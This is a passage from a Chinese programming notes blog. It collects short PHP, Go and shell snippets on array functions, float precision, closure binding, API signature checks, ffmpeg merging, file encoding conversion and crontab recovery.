class="string">'read'</span> =&gt; <span class="literal">true</span>, <span class="string">'write'</span> =&gt; <span class="literal">true</span>, <span class="string">'execute'</span> =&gt; <span class="literal">true</span>];</span><br><span class="line">var_dump((bool)array_product($power));</span><br><span class="line"><span class="comment">// 结果 true</span></span><br><span class="line">$power = [<span class="string">'read'</span> =&gt; <span class="literal">true</span>, <span class="string">'write'</span> =&gt; <span class="literal">true</span>, <span class="string">'execute'</span> =&gt; <span class="literal">false</span>];</span><br><span class="line">var_dump((bool)array_product($power));</span><br><span class="line"><span class="comment">// 结果 false</span></span><br><span class="line">$power = [<span class="string">'read'</span> =&gt; <span class="literal">true</span>, <span class="string">'write'</span> =&gt; <span class="literal">true</span>, <span class="string">'execute'</span> =&gt; <span class="string">'true'</span>];</span><br><span class="line">var_dump((bool)array_product($power));</span><br><span class="line"><span class="comment">// 结果 false</span></span><br><span class="line">$input = [<span class="string">'foo'</span>, <span class="literal">false</span>, <span class="number">-1</span>, <span class="literal">null</span>, <span class="string">''</span>, []];</span><br><span class="line">var_dump(array_filter($input));</span><br><span class="line"><span class="comment">// 结果 [0 =&gt; 'foo', 2 =&gt; -1]</span></span><br><span class="line">$input = [<span class="number">0</span> =&gt; <span class="number">233</span>, <span class="number">99</span> =&gt; <span class="number">666</span>];</span><br><span class="line">var_dump(array_values($input));</span><br><span class="line"><span class="comment">// 结果 [0 =&gt; 233, 1 =&gt; 66] 不止重置数字索引还会将字符串键名也同样删除并重置</span></span><br><span class="line">input = [<span class="string">'hello'</span> =&gt; <span class="string">'world'</span>, <span class="number">0</span> =&gt; <span class="number">233</span>, <span class="number">99</span> =&gt; <span class="number">666</span>];</span><br><span class="line">var_dump(array_slice($input, <span class="number">0</span>));</span><br><span class="line"><span class="comment">// 结果 ['hello' =&gt; 'world', 0 =&gt; 233, 1 =&gt; 66]</span></span><br><span class="line">$raw = [<span class="string">'id'</span> =&gt; <span class="number">1</span>, <span class="string">'name'</span> =&gt; <span class="string">'zane'</span>, <span class="string">'password'</span> =&gt; <span class="string">'123456'</span>];</span><br><span class="line"><span class="comment">// 用 PHP 内置函数实现</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">removeKeys</span>(<span class="params">$array, $keys</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> array_diff_key($array, array_flip($keys));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 移除 id 键 https://www.0php.net/posts/%E5%B7%A7%E7%94%A8-PHP-%E6%95%B0%E7%BB%84%E5%87%BD%E6%95%B0.html</span></span><br><span class="line">var_dump(removeKeys($raw, [<span class="string">'id'</span>, <span class="string">'password'</span>]));</span><br><span class="line"><span class="comment">// 结果 ['name' =&gt; 'zane']</span></span><br><span class="line">$input = [<span class="string">'you are'</span> =&gt; <span class="number">666</span>, <span class="string">'i am'</span> =&gt; <span class="number">233</span>, <span class="string">'he is'</span> =&gt; <span class="number">233</span>, <span class="string">'she is'</span> =&gt; <span class="number">666</span>];</span><br><span class="line">$result = array_flip(array_flip($input));</span><br><span class="line">var_dump($result);</span><br><span class="line"><span class="comment">// 结果 ['she is' =&gt; 666, 'he is' =&gt; 233]</span></span><br></pre></td></tr></table></figure>
<h3 id="浮点数精确度"><a href="#浮点数精确度" class="headerlink" title="浮点数精确度"></a>浮点数精确度</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4.35</span><span class="number">-4.34</span>等于<span class="number">0.0099999999999998</span></span><br><span class="line"><span class="comment">// 设置默认小数点保留位数</span></span><br><span class="line"></span><br><span class="line">bcscale(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加法</span></span><br><span class="line"></span><br><span class="line">echo bcadd(<span class="number">1234567890.123</span>, <span class="number">987654321987654321</span>), PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 减法https://learnku.com/articles/23967</span></span><br><span class="line"></span><br><span class="line">echo bcsub(<span class="number">1234567890.123</span>, <span class="number">987654321987654321</span>), PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 乘法</span></span><br><span class="line"></span><br><span class="line">echo bcmul(<span class="number">1234567890.123</span>, <span class="number">987654321987654321</span>), PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 除法，指定保留小数后20位，否则小数点不够结果会是0</span></span><br><span class="line"></span><br><span class="line">echo bcdiv(<span class="number">1234567890.123</span>, <span class="number">987654321987654321</span>, <span class="number">20</span>), PHP_EOL;</span><br><span class="line">或者这时候、你需要对比两个数值的大小范围、我建议你这样做，使用bccomp(<span class="string">'1.00'</span>,<span class="string">'1.00'</span>,<span class="number">2</span>)比较两个数字的大小</span><br></pre></td></tr></table></figure>
<h3 id="windows换行符转换"><a href="#windows换行符转换" class="headerlink" title="windows换行符转换"></a>windows换行符转换</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">'s/\r//'</span> build.sh &amp;&amp; bash build.sh</span><br></pre></td></tr></table></figure>
<h3 id="控制字符检测"><a href="#控制字符检测" class="headerlink" title="控制字符检测"></a>控制字符检测</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$strings = array(<span class="string">'string1'</span> =&gt; <span class="string">"\n\r\t"</span>, <span class="string">'string2'</span> =&gt; <span class="string">'arf12'</span>);</span><br><span class="line">foreach ($strings <span class="keyword">as</span> $name =&gt; $testcase) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ctype_cntrl($testcase)) &#123;</span><br><span class="line">        echo <span class="string">"The string '$name' consists of all control characters.\n"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">"The string '$name' does not consist of all control characters.\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(checkdate(<span class="number">12</span>, <span class="number">31</span>, <span class="number">2000</span>)); <span class="comment">// 输出：bool(true)</span></span><br><span class="line">var_dump(checkdate(<span class="number">2</span>, <span class="number">29</span>, <span class="number">2001</span>)); <span class="comment">// 输出：bool(false)</span></span><br></pre></td></tr></table></figure>
<h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Order</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    private $orderId = <span class="string">'001'</span>;</span><br><span class="line"></span><br><span class="line">    private <span class="keyword">static</span> $defaultMoney = <span class="string">'100'</span>;</span><br><span class="line"></span><br><span class="line">    public $num = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$getOrderId = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;orderId;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$getNum = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;num;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$getDefaultMoney = <span class="keyword">static</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Order::$defaultMoney;</span><br><span class="line">&#125;;</span><br><span class="line">$getDefaultMoney1 = Closure::bind($getDefaultMoney, <span class="literal">null</span>, <span class="attr">Order</span>::<span class="class"><span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">// 输出：100</span></span><br><span class="line"></span><br><span class="line">$getOrderId1 = Closure::bind($getOrderId, <span class="literal">null</span>, <span class="attr">Order</span>::<span class="class"><span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">// 输出:PHP Fatal error:  Uncaught Error: Using $this when not in object context</span></span><br><span class="line"></span><br><span class="line">$getNum1 = Closure::bind($getNum, <span class="literal">null</span>, <span class="attr">Order</span>::<span class="class"><span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">// 输出:PHP Fatal error:  Uncaught Error: Using $this when not in object context</span></span><br><span class="line">$getDefaultMoney2 = Closure::bind($getDefaultMoney, <span class="keyword">new</span> Order(), <span class="attr">Order</span>::<span class="class"><span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">// 输出：PHP Warning:  Cannot bind an instance to a static closure</span></span><br><span class="line"></span><br><span class="line">$getOrderId2 = Closure::bind($getOrderId, <span class="keyword">new</span> Order(), <span class="attr">Order</span>::<span class="class"><span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">// 输出 string(3) "001"</span></span><br><span class="line"></span><br><span class="line">$getNum2 = Closure::bind($getNum, <span class="keyword">new</span> Order(), <span class="attr">Order</span>::<span class="class"><span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">// 输出 int(1)</span></span><br><span class="line">$getDefaultMoney3 = Closure::bind($getDefaultMoney, <span class="keyword">new</span> Order());</span><br><span class="line"><span class="comment">// 输出 PHP Warning:  Cannot bind an instance to a static closure</span></span><br><span class="line"></span><br><span class="line">$getOrderId3 = Closure::bind($getOrderId, <span class="keyword">new</span> Order());</span><br><span class="line"><span class="comment">// 输出 Fatal error: Uncaught Error: Cannot access private property Order::$orderId</span></span><br><span class="line"></span><br><span class="line">$getNum3 = Closure::bind($getNum, <span class="keyword">new</span> Order());</span><br><span class="line"><span class="comment">// 输出 int(1)</span></span><br><span class="line">$getOrderId1 = $getOrderId-&gt;bindTo(<span class="keyword">new</span> Order(), <span class="attr">Order</span>::<span class="class"><span class="keyword">class</span>)</span>;</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-辅助函数"><a href="#Laravel-辅助函数" class="headerlink" title="Laravel 辅助函数"></a>Laravel 辅助函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">composer.json的autoload下加</span><br><span class="line"></span><br><span class="line"><span class="string">"autoload"</span>: &#123;</span><br><span class="line">    <span class="string">"classmap"</span>: [</span><br><span class="line">        <span class="string">"database"</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"psr-4"</span>: &#123;</span><br><span class="line">        <span class="string">"App\\"</span>: <span class="string">"app/"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"file"</span>: [</span><br><span class="line">        <span class="string">"app/helpers.php"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;,</span><br><span class="line">然后再运行以下命令进行重新加载文件即可：</span><br><span class="line"></span><br><span class="line"> $ composer dump-autoload</span><br></pre></td></tr></table></figure>
<h3 id="go结构体自定义排序"><a href="#go结构体自定义排序" class="headerlink" title="go结构体自定义排序"></a>go结构体自定义排序</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"sort"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type userInfo struct &#123;</span><br><span class="line">    Uid   int64 <span class="comment">//uid</span></span><br><span class="line">    Score int64 <span class="comment">//分数</span></span><br><span class="line">    Rank  int   <span class="comment">//排名</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Score []userInfo</span><br><span class="line"></span><br><span class="line">func (s Score) Len() int      &#123; <span class="keyword">return</span> len(s) &#125;</span><br><span class="line">func (s Score) Swap(i, j int) &#123; s[i], s[j] = s[j], s[i] &#125;</span><br><span class="line">func (s Score) Less(i, j int) bool &#123; <span class="keyword">return</span> s[i].Score &gt; s[j].Score &#125; <span class="comment">// 从大到小排序</span></span><br><span class="line"></span><br><span class="line">func main()  &#123;</span><br><span class="line">    users := []userInfo&#123;&#125;</span><br><span class="line">    scores := []int64&#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>,<span class="number">1</span>&#125;</span><br><span class="line">    fmt.Println(scores)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">10</span>; i++ &#123;</span><br><span class="line">        users = append(users, userInfo&#123;</span><br><span class="line">            Uid:   int64(i),</span><br><span class="line">            Score: scores[i],</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sort.Sort(Score(users))</span><br><span class="line">    fmt.Printf(<span class="string">"%+v \n"</span>,users)</span><br><span class="line"></span><br><span class="line">    res := ReckonRank(users)</span><br><span class="line">    <span class="keyword">for</span> _,<span class="attr">v</span> := range res &#123;</span><br><span class="line">        fmt.Printf(<span class="string">"user %+v \n"</span>,v)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func ReckonRank(users []userInfo) (usersInfo []userInfo) &#123;</span><br><span class="line">    index := <span class="number">0</span>          <span class="comment">//排名</span></span><br><span class="line">    <span class="keyword">var</span> lastScore int64 <span class="comment">//上一次分数</span></span><br><span class="line">    usersInfo = make([]userInfo, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> _, <span class="attr">user</span> := range users &#123;</span><br><span class="line">        <span class="keyword">if</span> user.Score != lastScore &#123;</span><br><span class="line">            index ++</span><br><span class="line">            lastScore = user.Score</span><br><span class="line">        &#125;</span><br><span class="line">        usersInfo = append(usersInfo, userInfo&#123;</span><br><span class="line">                Uid:   user.Uid,</span><br><span class="line">                Score: user.Score,</span><br><span class="line">                Rank:  index,</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="api签名"><a href="#api签名" class="headerlink" title="api签名"></a>api签名</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://github.com/larvacent/laravel-auth-signature-guard/blob/master/src/SignatureGuard.php</span></span><br><span class="line"><span class="comment">//验证公共请求参数</span></span><br><span class="line">        <span class="keyword">if</span> (!$request-&gt;has(<span class="string">'app_id'</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AuthenticationException(<span class="string">'Missing app_id parameter.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$request-&gt;has(<span class="string">'timestamp'</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AuthenticationException(<span class="string">'Missing timestamp parameter.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$request-&gt;has(<span class="string">'signature'</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AuthenticationException(<span class="string">'Missing signature parameter.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$request-&gt;has(<span class="string">'signature_method'</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AuthenticationException(<span class="string">'Missing signature_method parameter.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$request-&gt;has(<span class="string">'signature_nonce'</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AuthenticationException(<span class="string">'Missing signature_nonce parameter.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//获取参数</span></span><br><span class="line">        $params = $request-&gt;except([<span class="string">'signature'</span>]);</span><br><span class="line">        <span class="comment">//检查时间戳，误差1分钟</span></span><br><span class="line">        <span class="keyword">if</span> ((time() - intval($params[<span class="string">'timestamp'</span>])) &gt; <span class="number">60</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AuthenticationException(<span class="string">'Client time is incorrect.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//获取有效的 Client</span></span><br><span class="line">        <span class="keyword">if</span> (($client = $<span class="keyword">this</span>-&gt;clients-&gt;findActive($params[<span class="string">'app_id'</span>])) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AuthenticationException(<span class="string">'App_id is incorrect.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($request-&gt;input(<span class="string">'signature'</span>) != $<span class="keyword">this</span>-&gt;getSignature($params, $client-&gt;secret)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AuthenticationException(<span class="string">'Signature verification failed'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        protected <span class="function"><span class="keyword">function</span> <span class="title">getSignature</span>(<span class="params">array $params, $key</span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="comment">//参数排序</span></span><br><span class="line">                ksort($params);</span><br><span class="line">                $stringToSign = urlencode(http_build_query($params, <span class="literal">null</span>, <span class="string">'&amp;'</span>, PHP_QUERY_RFC3986));</span><br><span class="line">                <span class="comment">//签名</span></span><br><span class="line">                <span class="keyword">if</span> ($params[<span class="string">'signature_method'</span>] == self::SIGNATURE_METHOD_HMACSHA256) &#123;</span><br><span class="line">                    <span class="keyword">return</span> base64_encode(hash_hmac(<span class="string">'sha256'</span>, $stringToSign, $key, <span class="literal">true</span>));</span><br><span class="line">                &#125; elseif ($params[<span class="string">'signature_method'</span>] == self::SIGNATURE_METHOD_HMACSHA1) &#123;</span><br><span class="line">                    <span class="keyword">return</span> base64_encode(hash_hmac(<span class="string">'sha1'</span>, $stringToSign, $key, <span class="literal">true</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> AuthenticationException(<span class="string">'This signature method is not supported.'</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<h3 id="PHP数组扁平化"><a href="#PHP数组扁平化" class="headerlink" title="PHP数组扁平化"></a>PHP数组扁平化</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$data = [</span><br><span class="line">    <span class="string">'testArray'</span> =&gt; [</span><br><span class="line">        <span class="string">'string1'</span>,</span><br><span class="line">        <span class="string">'string2'</span>,</span><br><span class="line">        [</span><br><span class="line">            <span class="string">'string1'</span>,</span><br><span class="line">            <span class="string">'string2'</span>,</span><br><span class="line">        ],</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">'teststring'</span></span><br><span class="line">];</span><br><span class="line">echo <span class="string">"&lt;pre&gt;"</span>;https:<span class="comment">//learnku.com/articles/24318</span></span><br><span class="line"></span><br><span class="line">print_r(iterator_to_array(</span><br><span class="line">        <span class="keyword">new</span> RecursiveIteratorIterator(</span><br><span class="line">            <span class="keyword">new</span> RecursiveArrayIterator($data)</span><br><span class="line">        ),</span><br><span class="line">        <span class="literal">false</span>  <span class="comment">// use_keys:默认true</span></span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; string1</span></span><br><span class="line"><span class="comment">    [1] =&gt; string2</span></span><br><span class="line"><span class="comment">    [2] =&gt; string1</span></span><br><span class="line"><span class="comment">    [3] =&gt; string2</span></span><br><span class="line"><span class="comment">    [4] =&gt; teststring</span></span><br><span class="line"><span class="comment">)*/</span></span><br></pre></td></tr></table></figure>
<h3 id="ffmpeg"><a href="#ffmpeg" class="headerlink" title="ffmpeg"></a>ffmpeg</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum install ffmpeg</span><br><span class="line"></span><br><span class="line">自动批量合并视频文件https:<span class="comment">//github.com/kashu/merge.videos https://www.5yun.org/8224.html</span></span><br><span class="line">ffmpeg -i <span class="string">"工程师的痛只有工程师能懂_高清-XNzE1NTk3Mzky_part1.flv"</span> -c copy -bsf:v h264_mp4toannexb -f mpegts <span class="number">1.</span>ts</span><br><span class="line">ffmpeg -i <span class="string">"工程师的痛只有工程师能懂_高清-XNzE1NTk3Mzky_part2.flv"</span> -c copy -bsf:v h264_mp4toannexb -f mpegts <span class="number">2.</span>ts</span><br><span class="line">ffmpeg -i <span class="string">"concat:1.ts|2.ts"</span> -c copy -bsf:a aac_adtstoasc <span class="string">"工程师的痛只有工程师能懂.mp4"</span></span><br></pre></td></tr></table></figure>
<h3 id="1752年9月2日的后面竟然是14日"><a href="#1752年9月2日的后面竟然是14日" class="headerlink" title="1752年9月2日的后面竟然是14日"></a>1752年9月2日的后面竟然是14日</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@su ~]# cal 9 1752</span><br><span class="line">   September <span class="number">1752</span></span><br><span class="line">Su Mo Tu We Th Fr Sa</span><br><span class="line">       <span class="number">1</span>  <span class="number">2</span> <span class="number">14</span> <span class="number">15</span> <span class="number">16</span></span><br><span class="line"><span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span></span><br><span class="line"><span class="number">24</span> <span class="number">25</span> <span class="number">26</span> <span class="number">27</span> <span class="number">28</span> <span class="number">29</span> <span class="number">30</span></span><br><span class="line">https:<span class="comment">//tonydeng.github.io/2006/03/28/A-Linux-command-a-human-civilization/</span></span><br></pre></td></tr></table></figure>
<h3 id="批量转换文件编码"><a href="#批量转换文件编码" class="headerlink" title="批量转换文件编码"></a>批量转换文件编码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">DIR=$1 # 转换编码文件目录</span><br><span class="line">FT=$2  # 需要转换的文件类型（扩展名）</span><br><span class="line">SE=$3  # 原始编码</span><br><span class="line">DE=$4  # 目标编码</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> <span class="string">`find $DIR -type f -name "*.$FT"`</span>; <span class="keyword">do</span></span><br><span class="line">	echo <span class="string">"conversion $file encoding $SE to $DE"</span></span><br><span class="line">    iconv -f $SE -t $DE <span class="string">"$file"</span> &gt; <span class="string">"$file"</span>.tmp</span><br><span class="line">    mv -f <span class="string">"$file"</span>.tmp <span class="string">"$file"</span></span><br><span class="line">done</span><br><span class="line">该脚本已经提交到github上。https:<span class="comment">//github.com/tonydeng/note/blob/1594ae267114effa910ff2511176d3dbf7968471/sh/batch_conversion_encoding.sh</span></span><br><span class="line"></span><br><span class="line">调用方式</span><br><span class="line">➜  ~ ./batch_conversion_encoding.sh ~<span class="regexp">/sdk1 java GBK UTF8</span></span><br></pre></td></tr></table></figure>
<h3 id="crontab-任务误删恢复"><a href="#crontab-任务误删恢复" class="headerlink" title="crontab 任务误删恢复"></a>crontab 任务误删恢复</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat /<span class="keyword">var</span>/log/cron* | grep CMD | awk -F<span class="string">'CMD'</span> <span class="string">'&#123;print $2&#125;'</span> | awk -F<span class="string">'[(|)]'</span> <span class="string">'&#123;print $2&#125;'</span> | sort -u</span><br><span class="line">backup_crontab.sh</span><br><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line">#https://liam.page/2017/11/30/recovery-crontab-tasks/</span><br><span class="line">BACKUP_DIRECTORY=<span class="string">"$&#123;HOME&#125;/crontab_backup"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -e <span class="string">"$&#123;BACKUP_DIRECTORY&#125;"</span> ]; then</span><br><span class="line">        mkdir -p $&#123;BACKUP_DIRECTORY&#125;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">crontab -l &gt; 